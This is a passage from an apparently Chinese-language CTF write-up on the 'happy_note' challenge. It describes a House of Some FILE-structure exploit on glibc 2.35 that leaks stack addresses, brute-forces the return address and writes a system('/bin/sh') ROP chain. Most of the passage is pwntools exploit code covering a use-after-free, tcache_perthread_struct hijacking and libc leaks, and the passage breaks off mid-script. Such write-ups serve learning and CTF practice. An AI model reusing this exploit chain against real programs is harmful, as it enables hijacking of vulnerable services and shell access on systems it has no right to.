<p>合起来大概是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r.recvuntil(<span class="string">b&quot;It&#x27;s empty!\n&quot;</span>)</span><br><span class="line">fp1 = write_template(libc_environ, <span class="number">8</span>, fp_addr[<span class="number">2</span>])</span><br><span class="line">fp2 = read_template(fp_addr[<span class="number">3</span>], fp_length * <span class="number">2</span>, fp_addr[<span class="number">3</span>]) <span class="comment"># todo: read fp3 and fp4</span></span><br><span class="line">r.send(fp1 + fp2)</span><br><span class="line">stack_environ = u64(r.recv())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(stack_environ) = &#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Part-3-确定rop地址">Part.3 确定rop地址<a class="anchor" href="#Part-3-确定rop地址">·</a></h2>
<p>在执行到<code>fp2</code>的<code>_IO_OVERFLOW</code>后，就可以触发<code>read</code>写入<code>fp3</code>和<code>fp4</code></p>
<p>其中<code>fp3</code>做的是通过<code>stack_environ</code>泄露栈上数据，执行到<code>fp3</code>的<code>_IO_OVERFLOW</code>后，可以触发<code>write</code>泄露栈上的数据</p>
<p>但问题是怎么通过泄露出来的数据知道<code>ret</code>的地址，也就是<code>rop</code>该写在哪个地址</p>
<p>据说 @CSOME 有个很diao的二分法，不过我只会暴力<code>brute force</code>，也够用了</p>
<p>首先我在<code>gdb</code>上大概可以知道栈长的这样子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7ffc5d62b248</span> —▸ <span class="number">0x7f9e76c894ff</span> (_IO_cleanup+<span class="number">15</span>) ◂— mov ebx, eax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffc5d62b250</span> —▸ <span class="number">0x7f9e76dea6e8</span> (__elf_set___libc_atexit_element__IO_cleanup__) —▸ <span class="number">0x7f9e76c894f0</span> (_IO_cleanup) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffc5d62b258</span> —▸ <span class="number">0x7f9e76c496f7</span> (__run_exit_handlers+<span class="number">563</span>) ◂— add rbx, <span class="number">8</span></span><br><span class="line">... ...</span><br><span class="line"><span class="number">34</span>:<span class="number">01</span>a0│     <span class="number">0x7ffc5d62b3e8</span> —▸ <span class="number">0x7ffc5d62cfd9</span> ◂— <span class="string">&#x27;LD_LIBRARY_PATH=.&#x27;</span></span><br></pre></td></tr></table></figure>
<p>这个例子中，<code>(_IO_cleanup+15)</code>那一行，也就是<code>0x7ffc5d62b248</code>就是我想要的<code>ret</code>地址，而<code>'LD_LIBRARY_PATH=.'</code>的那一行，也就是<code>0x7ffc5d62b3e8</code>就是<code>stack_environ</code>的地址</p>
<p>PS：我用的带符号的调试库得到的数据，如果用题目的库的话可能会没有符号，这时可以通过<code>pwndbg</code>的<code>BACKTRACE</code>调用栈找到<code>ret</code>地址上应该是什么内容，大概是<code>on_exit</code>的上两个就是<code>(_IO_cleanup+15)</code></p>
<p>通过例子中的数据可以知道，<code>ret</code>地址应该在<code>stack_environ</code>上方不远的地方，而且在<code>libc_base</code>泄露的情况下，<code>ret</code>地址上写的内容也是知道的（也就是例子中的<code>(_IO_cleanup+15)</code>）</p>
<p>那么就可以通过<code>fp3</code>的<code>write</code>泄露<code>stack_environ</code>上方的一段数据，然后枚举这段数据中<code>(_IO_cleanup+15)</code>的位置，来确定<code>ret</code>的地址</p>
<p>大概就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bf_count = <span class="number">0x400</span></span><br><span class="line"><span class="keyword">assert</span> bf_count % <span class="number">8</span> == <span class="number">0</span></span><br><span class="line">fp3 = write_template(stack_environ - bf_count, bf_count, fp_addr[<span class="number">4</span>])</span><br><span class="line">fp4 = read_template(fp_addr[<span class="number">5</span>], fp_length, fp_addr[<span class="number">5</span>]) <span class="comment"># todo: read fp5</span></span><br><span class="line">r.send(fp3 + fp4)</span><br><span class="line">stack_data = r.recv()</span><br><span class="line">stack_data = [u64(stack_data[i*<span class="number">8</span>: (i+<span class="number">1</span>)*<span class="number">8</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bf_count // <span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    ret_fun = libc_IO_cleanup = libc.symbols[<span class="string">&#x27;_IO_cleanup&#x27;</span>] + <span class="number">15</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ret_fun = libc_base + <span class="number">0x8ebfe</span>   <span class="comment"># from gdb</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(stack_data)):</span><br><span class="line">    sdi = stack_data[i]</span><br><span class="line">    <span class="keyword">if</span> sdi == ret_fun:</span><br><span class="line">        rop_addr = stack_environ - bf_count + i * <span class="number">8</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;rop_addr not found&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(rop_addr) = &#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Part-4-写入rop">Part.4 写入rop<a class="anchor" href="#Part-4-写入rop">·</a></h2>
<p>在执行到<code>fp4</code>的<code>_IO_OVERFLOW</code>后，就可以触发<code>read</code>写入<code>fp5</code>，然后通过<code>fp5</code>的<code>_IO_OVERFLOW</code>的<code>read</code>写入<code>rop</code></p>
<p><code>rop</code>应该就是很熟悉的内容了，而这里需要注意的是<code>fp5</code>的<code>_chain</code>需要设置为<code>0</code>，这样才能结束<code>_IO_flush_all_lockp</code>的循环，让函数返回</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rop = flat([</span><br><span class="line">    libc_ret,   <span class="comment"># align to 16 bytes</span></span><br><span class="line">    libc_pop_rdi, libc_sh,</span><br><span class="line">    libc_system</span><br><span class="line">], filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">fp5 = read_template(rop_addr, <span class="built_in">len</span>(rop), <span class="number">0</span>) <span class="comment"># todo: read rop and return</span></span><br><span class="line">r.send(fp5)</span><br><span class="line">r.send(rop)</span><br></pre></td></tr></table></figure>
<h1 id="参考Exp">参考Exp<a class="anchor" href="#参考Exp">·</a></h1>
<h2 id="失败例子的Exp（NG）">失败例子的Exp（NG）<a class="anchor" href="#失败例子的Exp（NG）">·</a></h2>
<p>虽然没打成功，但这里还是象征性地贴一个参考代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">T = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">True</span></span><br><span class="line">AUTOGDB = <span class="literal">True</span></span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    env = &#123;<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>: <span class="string">&#x27;.&#x27;</span>&#125;</span><br><span class="line">    r = process(<span class="string">&#x27;./happy_note&#x27;</span>, env=env)</span><br><span class="line">    <span class="keyword">if</span> AUTOGDB:</span><br><span class="line">        gid, g = gdb.attach(r, api=<span class="literal">True</span>, gdbscript=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;dir ./src&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">        AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;c&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(r, gdbscript=<span class="string">&#x27;dir ./src&#x27;</span>)</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&#x27;Waiting GDB...&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    AUTOGDB = <span class="literal">False</span></span><br><span class="line">    r = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28144</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, mode=<span class="number">1</span></span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Note size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a mode: [1] or [2]&#x27;</span>, <span class="built_in">str</span>(mode).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Which one do you want to show?&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> r.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Edit your content:&#x27;</span>, content)</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;uaf and leak tcache_key&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">delete(<span class="number">1</span>)       <span class="comment"># make sure tcache-&gt;counts[tc_idx] &gt; 0</span></span><br><span class="line">backdoor(<span class="number">0</span>)     <span class="comment"># uaf</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump *(size_t*)$rebase(0x40a0)-0x10 0x240&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">heap_4b0 = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">tcache_key = show(<span class="number">0</span>)[<span class="number">8</span>:]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;tcache_key.<span class="built_in">hex</span>() = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;hijack tcache_perthread_struct&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="comment">#edit(0, p64(PROTECT_PTR(heap_base + 0x10)))</span></span><br><span class="line">edit(<span class="number">0</span>, p64(heap_4b0 ^ <span class="number">0x4b0</span> ^ <span class="number">0x10</span>))</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x200</span>, <span class="number">2</span>)    <span class="comment"># overlapping chunk 0</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x200</span>, <span class="number">2</span>)    <span class="comment"># tcache_perthread_struct</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;leak heap_base&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x178</span>)</span><br><span class="line">heap_base = u64(show(<span class="number">3</span>)[<span class="number">0x178</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump *(size_t*)$rebase(0x40b8)-0x10 0x200&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(heap_base) = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PROTECT_PTR</span>(<span class="params">ptr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (heap_base &gt;&gt; <span class="number">12</span>) ^ ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;leak libc_base&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="comment"># rewrite tcache_perthread_struct</span></span><br><span class="line">counts = [<span class="number">0</span>] * <span class="number">64</span></span><br><span class="line">entries = [<span class="number">0</span>] * <span class="number">64</span></span><br><span class="line">tc_idx = (<span class="number">0x210</span> - <span class="number">0x20</span>) // <span class="number">0x10</span></span><br><span class="line">counts[tc_idx] = <span class="number">7</span></span><br><span class="line">entries[tc_idx] = heap_base + <span class="number">0x2a0</span>     <span class="comment"># arbitrary heap address</span></span><br><span class="line">tps = <span class="string">b&#x27;&#x27;</span>.join([p16(_) <span class="keyword">for</span> _ <span class="keyword">in</span> counts] + [p64(_) <span class="keyword">for</span> _ <span class="keyword">in</span> entries])[:<span class="number">0x200</span>]</span><br><span class="line">edit(<span class="number">3</span>, tps)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc_base = u64(show(<span class="number">0</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0ce0</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-2.35-debug.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base) = &#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;fastbin attack&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h2 id="自动化House-of-Some-1的Exp">自动化House of Some 1的Exp<a class="anchor" href="#自动化House-of-Some-1的Exp">·</a></h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">T = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">True</span></span><br><span class="line">AUTOGDB = <span class="literal">True</span></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    env = &#123;<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>: <span class="string">&#x27;.&#x27;</span>&#125;</span><br><span class="line">    r = process(<span class="string">&#x27;./happy_note&#x27;</span>, env=env)</span><br><span class="line">    <span class="keyword">if</span> AUTOGDB:</span><br><span class="line">        gid, g = gdb.attach(r, api=<span class="literal">True</span>, gdbscript=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;dir ./src&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">        AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;c&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(r, gdbscript=<span class="string">&#x27;dir ./src&#x27;</span>)</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&#x27;Waiting GDB...&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    AUTOGDB = <span class="literal">False</span></span><br><span class="line">    r = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28465</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, mode=<span class="number">1</span></span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Note size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a mode: [1] or [2]&#x27;</span>, <span class="built_in">str</span>(mode).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Which one do you want to show?&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> r.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Edit your content:&#x27;</span>, content)</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uaf</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;fastbin attack and uaf&quot;&#x27;</span>) <span class="keyword">and</span> 